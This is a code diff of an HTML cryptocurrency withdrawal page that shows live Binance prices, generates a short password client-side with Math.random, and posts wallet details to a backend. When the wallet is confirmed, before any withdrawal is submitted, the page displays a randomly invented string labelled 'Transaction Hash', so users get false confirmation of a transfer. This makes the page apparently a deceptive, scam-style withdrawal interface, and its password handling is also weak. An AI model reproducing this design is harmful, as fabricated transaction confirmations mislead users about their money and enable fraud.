@@ -4,148 +4,219 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Withdrawal Page</title>
+
 <style>
-body { font-family: Arial,sans-serif; background: transparent; color: #fff; margin:0; padding:0;}
-.container {max-width:480px;margin:40px auto;background: rgba(0,0,0,0.6); padding:20px; border-radius:12px;}
-h2 {text-align:center;margin-bottom:20px;font-size:1.5em;}
-label{display:block;margin-top:10px;font-size:14px;}
-input,select,button{width:100%;padding:10px;margin:6px 0;border-radius:6px;border:none;font-size:14px;box-sizing:border-box;}
-input,select{background: rgba(255,255,255,0.1); color:#fff;}
-button{background:#00bfff;color:#fff;cursor:pointer;font-weight:bold;}
-button:disabled{background:#555;cursor:not-allowed;}
-.balance{font-size:13px;color:#0f0;margin-bottom:10px;text-align:right;}
-.fee{font-size:13px;color:#ff0;margin-bottom:5px;}
-#txHashDisplay{font-size:14px;margin-top:10px;color:#0ff;white-space: pre-line;}
-#copyBtn{display:none;margin-top:5px;padding:5px;font-size:13px;cursor:pointer;border:none;border-radius:5px;background:#00b894;color:#fff;}
-.button-row{display:flex;flex-wrap:wrap;gap:10px;margin-top:5px;}
-.button-row button{flex:1 1 48%;min-width:100px;}
-@media screen and (max-width:480px){.container{width:90%;padding:15px;margin:20px auto;}.button-row button{flex:1 1 100%;}}
+    body { font-family: Arial; background: transparent; color: #fff; margin:0; padding:0; }
+    .container { max-width:480px; margin:40px auto; background:rgba(0,0,0,0.6); padding:20px; border-radius:10px; }
+
+    h2 { text-align:center; font-size:1.3em; margin-bottom:20px; }
+
+    label { display:block; margin-top:12px; font-size:14px; }
+
+    select {
+        width:100%; padding:10px; margin-top:6px; border:none;
+        border-radius:6px; background:rgba(0,0,0,0.5); color:#fff;
+        font-weight:bold;
+    }
+
+    input, button {
+        width:100%; padding:10px; margin-top:6px; border:none;
+        border-radius:6px; background:rgba(255,255,255,0.18); color:#fff;
+    }
+
+    button { background:#00bfff; font-weight:bold; cursor:pointer; }
+    button:disabled { background:#444; cursor:not-allowed; }
+
+    .row { display:flex; justify-content:space-between; gap:10px; }
+    .row button { width:50%; }
+
+    #copyBtn, #submitBtn {
+        width:48%;
+        display:none;
+        margin-top:10px;
+    }
+
+    #hashDisplay { margin-top:10px; color:#0f0; white-space:pre-line; font-size:15px; }
 </style>
 </head>
+
 <body>
+
 <div class="container">
-<h2></h2>
+    <h2></h2>
 
-<label>Select Cryptocurrency</label>
-<select id="cryptoSelect">
-<option value="BTCUSDT">BTC</option>
-<option value="ETHUSDT">ETH</option>
-</select>
+    <label>Select Cryptocurrency</label>
+    <select id="coin">
+        <option value="BTC">BTC</option>
+        <option value="ETH">ETH</option>
+        <option value="USDT">USDT</option>
+        <option value="BNB">BNB</option>
+        <option value="XRP">XRP</option>
+        <option value="DOGE">DOGE</option>
+        <option value="SOL">SOL</option>
+        <option value="TRX">TRX</option>
+        <option value="ADA">ADA</option>
+        <option value="DOT">DOT</option>
+    </select>
 
-<label>Enter Coin Amount</label>
-<input type="number" id="coinAmount" placeholder="Enter coin amount" min="0">
-<div class="balance" id="usdtConverted">USDT Equivalent: 0</div>
-<div class="fee" id="feeDisplay">Fee 0.1 USDT, Actual Amount: 0</div>
+    <label>Enter Coin Amount</label>
+    <input type="number" id="amount" placeholder="Enter amount">
 
-<label>Withdrawal Password</label>
-<input type="password" id="withdrawPwd" placeholder="Enter withdrawal password">
+    <div style="text-align:right; font-size:12px; color:#0f0;">
+        USDT Equivalent: <span id="usdtValue">0</span>
+    </div>
 
-<div class="button-row">
-<button id="createPwdBtn">Create Password</button>
-<button id="confirmPwdBtn">Confirm Password</button>
-</div>
+    <label>Password</label>
+    <input type="password" id="password" placeholder="Enter password">
 
-<label>Wallet Address</label>
-<input type="text" id="wallet" placeholder="Enter wallet address">
+    <div class="row">
+        <button id="createPwdBtn" onclick="genPassword()">Create Password</button>
+        <button onclick="confirmPassword()">Confirm Password</button>
+    </div>
 
-<div class="button-row">
-<button id="confirmWalletBtn">Confirm Wallet Address</button>
-</div>
+    <button onclick="resetPassword()">Forgot Password?</button>
 
-<button id="submitBtn" disabled>Submit Withdrawal</button>
+    <label>Wallet Address</label>
+    <input id="wallet" placeholder="Paste wallet address">
 
-<div id="txHashDisplay"></div>
-<button id="copyBtn">Copy Transaction Hash</button>
+    <button id="walletBtn" onclick="confirmWallet()">Confirm Wallet Address</button>
+
+    <div id="hashDisplay"></div>
+
+    <div style="display:flex; justify-content:space-between;">
+        <button id="copyBtn" onclick="copyHash()">Copy Hash</button>
+        <button id="submitBtn" onclick="sendWithdrawal()">Submit Withdrawal</button>
+    </div>
 </div>
 
 <script>
-const API = "https://crypto-withdrawal-bot-production.up.railway.app";
-let walletBound=false,pwdCreated=false,currentWallet=null;
-const FEE=0.1;
+let generatedPassword = null;
+let confirmedPassword = false;
+let hashValue = null;
 
-function maskWallet(a){return a.slice(0,3)+'****'+a.slice(-3);}
-function check(){const q=parseFloat(coinAmount.value)||0;submitBtn.disabled=!(walletBound&&pwdCreated&&q>0);}
-
-coinAmount.oninput=()=>{
- const q=parseFloat(coinAmount.value)||0;
- usdtConverted.innerText='USDT Equivalent: '+(q*50);
- feeDisplay.innerText='Fee 0.1 USDT, Actual Amount: '+Math.max(q*50-FEE,0);
- check();
+// ----------------------
+// Binance WebSocket 实时价格
+// ----------------------
+let priceFeed = {
+    BTC:1, ETH:1, USDT:1, BNB:1, XRP:1, DOGE:1, SOL:1, TRX:1, ADA:1, DOT:1
 };
 
-createPwdBtn.onclick=()=>{
- if(!withdrawPwd.value.trim()) return alert("Enter password");
- pwdCreated=true;
- withdrawPwd.disabled=true;
- createPwdBtn.disabled=true;
- alert("Password created");
- check();
-};
+function initPriceFeed() {
+    const ws = new WebSocket("wss://stream.binance.com:9443/ws/!ticker@arr");
 
-confirmPwdBtn.onclick=()=>alert("Password confirmed");
+    ws.onmessage = (msg) => {
+        const data = JSON.parse(msg.data);
+        data.forEach(t => {
+            if (t.s.endsWith("USDT")) {
+                let coin = t.s.replace("USDT", "");
+                if (priceFeed[coin] !== undefined) {
+                    priceFeed[coin] = parseFloat(t.c);
+                }
+            }
+        });
+        calcUSDT(); // 🔥 每次收到新价格都同步更新
+    };
+}
+initPriceFeed();
 
-// =========================
-// Confirm Wallet Address
-// =========================
-confirmWalletBtn.onclick=async()=>{
- const v = wallet.value.trim();
- const pwd = withdrawPwd.value.trim();
+// 自动计算 USDT
+function calcUSDT() {
+    const amount = Number(document.getElementById("amount").value || 0);
+    const coin = document.getElementById("coin").value;
+    const price = priceFeed[coin] || 1;
 
- if (!v) return alert("Enter wallet address");
- if (!pwd) return alert("Enter withdrawal password first");
+    document.getElementById("usdtValue").innerText = (amount * price).toFixed(2);
+}
 
- let r = await fetch(API+"/api/wallet",{
-   method:"POST",
-   headers:{ "Content-Type":"application/json" },
-   body:JSON.stringify({ wallet:v, password:pwd })
- });
+document.getElementById("amount").addEventListener("input", calcUSDT);
+document.getElementById("coin").addEventListener("change", calcUSDT);
 
- let d = await r.json();
+// ----------------------
+// Password Logic
+// ----------------------
+function genPassword() {
+    if (generatedPassword) return alert("Password already created.");
 
- if (d.ok){
-   currentWallet = v;
-   wallet.value = maskWallet(currentWallet);
-   wallet.disabled = true;
-   walletBound = true;
-   alert("Wallet confirmed");
-   check();
- } else {
-   alert(d.error || "Fail");
- }
-};
+    generatedPassword = Math.random().toString(36).substring(2, 8).toUpperCase();
+    alert("Generated Password: " + generatedPassword);
 
-// =========================
+    document.getElementById("createPwdBtn").disabled = true;
+}
+
+function confirmPassword() {
+    const pwd = document.getElementById("password").value;
+    if (!generatedPassword) return alert("Create password first.");
+    if (pwd !== generatedPassword) return alert("Incorrect password.");
+    confirmedPassword = true;
+    alert("Password confirmed.");
+}
+
+function resetPassword() {
+    if (!generatedPassword) return alert("You have no password.");
+    const oldPwd = prompt("Enter old password:");
+    if (oldPwd !== generatedPassword) return alert("Incorrect password.");
+    const newPwd = prompt("Enter new password:");
+    generatedPassword = newPwd;
+    alert("Password updated.");
+}
+
+// ----------------------
+// Confirm wallet (只能点一次）
+// ----------------------
+function confirmWallet() {
+    if (!confirmedPassword) return alert("Confirm password first.");
+
+    const wallet = document.getElementById("wallet").value;
+    if (!wallet) return alert("Enter wallet address.");
+
+    hashValue = "TX-" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+    document.getElementById("hashDisplay").innerText =
+        "Transaction Hash:\n" + hashValue;
+
+    document.getElementById("walletBtn").disabled = true;
+    document.getElementById("copyBtn").style.display = "inline-block";
+    document.getElementById("submitBtn").style.display = "inline-block";
+}
+
+function copyHash() {
+    navigator.clipboard.writeText(hashValue);
+    alert("Hash copied!");
+}
+
+// ----------------------
 // Submit Withdrawal
-// =========================
-submitBtn.onclick=async()=>{
- const qty = parseFloat(coinAmount.value)||0;
- const usdt = qty * 50;
- const pwd = withdrawPwd.value.trim();
+// ----------------------
+async function sendWithdrawal() {
+    const btn = document.getElementById("submitBtn");
+    btn.disabled = true;
 
- let r = await fetch(API+"/api/withdraw",{
-   method:"POST",
-   headers:{ "Content-Type":"application/json" },
-   body:JSON.stringify({
-     coin: cryptoSelect.value,
-     amount: qty,
-     usdt: usdt,
-     wallet: currentWallet,
-     password: pwd
-   })
- });
+    const payload = {
+        coin: document.getElementById("coin").value,
+        amount: document.getElementById("amount").value,
+        usdt: document.getElementById("usdtValue").innerText,
+        wallet: document.getElementById("wallet").value,
+        password: generatedPassword,
+        hash: hashValue
+    };
 
- let d = await r.json();
+    try {
+        const res = await fetch("/api/wallet", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
 
- if (d.ok){
-   txHashDisplay.innerText = "Transaction Hash: " + d.hash;
-   copyBtn.style.display = "block";
-   submitBtn.disabled = true;
- } else {
-   alert(d.error);
- }
-};
+        const data = await res.json();
 
-copyBtn.onclick=()=>navigator.clipboard.writeText(txHashDisplay.innerText).then(()=>alert("Copied"));
+        if (data.success) alert("Withdrawal submitted!");
+        else alert("Server error: " + data.error);
+
+    } catch(e) {
+        alert("Network error");
+    }
+}
 </script>
+
 </body>
 </html>
